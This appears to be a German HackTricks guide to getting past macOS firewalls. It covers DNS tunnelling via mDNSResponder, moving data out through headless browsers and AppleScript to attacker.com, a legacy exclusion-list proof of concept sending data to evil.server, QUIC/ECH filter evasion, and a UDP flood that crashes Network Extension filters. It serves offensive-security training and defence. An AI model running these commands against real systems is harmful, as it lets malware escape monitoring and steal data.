# Umgehen von Firewalls unter macOS

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps als funktionsfähig befunden.

### Ausnutzen von Whitelist-Namen

- Zum Beispiel die Malware mit den Namen bekannter macOS-Prozesse wie **`launchd`** aufrufen

### Synthetic Click

- Wenn die Firewall den Benutzer um eine Berechtigung bittet, die Malware **auf „Allow“ klicken** lassen

### **Apple-signierte Binaries verwenden**

- Wie **`curl`**, aber auch andere wie **`whois`**

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. Außerdem könnte iCloud als C2 verwendet werden.

### Generic Bypass

Einige Ideen, um Firewalls zu umgehen

### Erlaubten Traffic prüfen

Wenn du den erlaubten Traffic kennst, kannst du potenziell whitelisted Domains oder Anwendungen identifizieren, die auf diese zugreifen dürfen
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS missbrauchen

Unter macOS kommuniziert ein Prozess **nicht** selbst mit dem DNS-Server. Die Namensauflösung wird über **XPC** von **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) vermittelt, einem von Apple signierten System-Daemon. Daher verlässt jede Abfrage auf dem Rechner den Host als Datenverkehr **von `mDNSResponder`** statt von dem Prozess, der sie angefordert hat. Firewalls neigen deshalb dazu, diesem Daemon bedingungslos zu vertrauen — ihn zu blockieren würde die Namensauflösung für das gesamte System unterbrechen.<sup>[1]</sup>

Dadurch bleibt DNS ein offener Kanal, selbst wenn die Firewall die eigenen Sockets der Malware blockiert:<sup>[1]</sup>

1. Die Malware versucht, eine Verbindung zu `evil.com` herzustellen. Ihre **eigene** ausgehende Verbindung wird von der Firewall geprüft und **blockiert**.
2. Stattdessen bittet die Malware `mDNSResponder`, `evil.com` über XPC **aufzulösen**.
3. Die Firewall prüft die daraus resultierende Abfrage, sieht den vertrauenswürdigen, von Apple signierten Resolver als Urheber und **erlaubt sie**.
4. Die Abfrage erreicht den DNS-Server — und wenn der Angreifer den autoritativen Server für `evil.com` betreibt, kontrolliert er beide Enden des Austauschs.

Da der Angreifer diese Zone besitzt, ist niemals eine „Verbindung“ erforderlich: Daten werden in den **abgefragten Labels** (z. B. `<encoded-chunk>.evil.com`) herausgeschmuggelt, und Befehle kommen in den **Antwortdatensätzen** (TXT, A, CNAME …) zurück — klassisches DNS tunnelling über einen vollständig freigeschalteten Prozess.

Jeder nicht privilegierte Prozess kann den Daemon direkt ansteuern. Das ist eine einfache Möglichkeit, zu bestätigen, dass der Pfad offen ist:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Wenn du **Code in einen Prozess injizieren** kannst, der Verbindungen zu jedem beliebigen Server herstellen darf, könntest du die Firewall-Schutzmechanismen umgehen:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Aktuelle macOS-Firewall-Bypass-Schwachstellen (2023–2025)

### Bypass des Web content filter (Screen Time) – **CVE-2024-44206**
Im Juli 2024 behob Apple einen kritischen Fehler in Safari/WebKit, der den systemweiten „Web content filter“ beeinträchtigte, der von der elterlichen Kontrolle Screen Time verwendet wird.
Eine speziell gestaltete URI (beispielsweise mit doppelter URL-Codierung von „://“) wird von der Screen-Time-ACL nicht erkannt, aber von WebKit akzeptiert, sodass die Anfrage ungefiltert gesendet wird. Jeder Prozess, der eine URL öffnen kann (einschließlich sandboxed oder unsigniertem Code), kann dadurch Domains erreichen, die vom Benutzer oder einem MDM-Profil ausdrücklich blockiert wurden.<sup>[2]</sup>

Praktischer Test (ungepatchtes System):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Fehler bei der Reihenfolge von Packet-Filter-(PF-)Regeln in frühen Versionen von macOS 14 „Sonoma“
Während des macOS-14-Beta-Zyklus führte Apple eine Regression im userspace wrapper um **`pfctl`** ein.
Regeln, die mit dem Schlüsselwort `quick` hinzugefügt wurden (von vielen VPN kill-switches verwendet), wurden stillschweigend ignoriert, wodurch Traffic-leaks auftraten, obwohl eine VPN-/Firewall-GUI *blocked* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.

Schneller leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Ausnutzen von Apple-signierten Helper-Services (Legacy – vor macOS 11.2)
Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`** etwa 50 Apple-Binaries wie **`nsurlsessiond`** und den App Store, alle mit dem Network Extension Framework implementierten Socket-Filter-Firewalls (LuLu, Little Snitch usw.) zu umgehen.
Malware konnte einfach einen ausgeschlossenen Prozess starten – oder Code in diesen injizieren – und seinen eigenen Traffic über den bereits freigegebenen Socket tunneln. Apple hat die Ausschlussliste in macOS 11.2 vollständig entfernt, aber die Technik ist auf Systemen, die nicht aktualisiert werden können, weiterhin relevant.<sup>[3]</sup>

Beispiel für einen Proof-of-Concept (vor 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH zum Umgehen von Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers verwenden TLS ClientHello SNI/ALPN als Grundlage. Mit **HTTP/3 über QUIC (UDP/443)** und **Encrypted Client Hello (ECH)** bleibt die SNI verschlüsselt, NetExt kann den Datenfluss nicht analysieren, und Hostname-Regeln schlagen häufig fail-open fehl, wodurch Malware blockierte Domains erreichen kann, ohne DNS zu berühren.<sup>[5]</sup>

Minimaler PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Wenn QUIC/ECH weiterhin aktiviert ist, ist dies ein einfacher Weg zur Umgehung von Hostname-Filtern.

### Instabilität der macOS-15-„Sequoia“-Network-Extension (2024–2025)
Frühe Builds von 15.0/15.1 bringen Filter von Drittanbietern für **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne usw.) zum Absturz. Wenn der Filter neu startet, verwirft macOS seine Flow-Regeln, und viele Produkte wechseln in den Fail-open-Modus. Das Flooding des Filters mit Tausenden kurzen UDP-Flows (oder das Erzwingen von QUIC/ECH) kann den Absturz wiederholt auslösen und ein Zeitfenster für C2/Exfil schaffen, während die GUI weiterhin behauptet, dass die Firewall ausgeführt wird.<sup>[4]</sup>

Schnelle Reproduktion (auf einer sicheren Labor-Maschine):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Tooling-Tipps für moderne macOS-Versionen

1. Aktuelle PF-Regeln untersuchen, die von GUI-Firewalls erzeugt werden:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Binärdateien auflisten, die bereits über das *outgoing-network*-Entitlement verfügen (nützlich zum piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Eigenen Network Extension Content Filter programmgesteuert in Objective-C/Swift registrieren.
Ein minimales rootless PoC, das Pakete an einen lokalen Socket weiterleitet, ist im **LuLu**-Quellcode von Patrick Wardle verfügbar.

## Referenzen

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS-Firewalls erstellen und umgehen](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Bypass des Apple-Web-Content-Filters ermöglicht uneingeschränkten Zugriff auf blockierte Inhalte (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple entfernt macOS-Funktion, die es Apps ermöglichte, die Firewall-Sicherheit zu umgehen - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersicherheitsprodukte fallen nach dem macOS-Sequoia-Update aus - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Netzwerkschutz verwenden, um macOS-Verbindungen zu schädlichen Websites zu verhindern - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
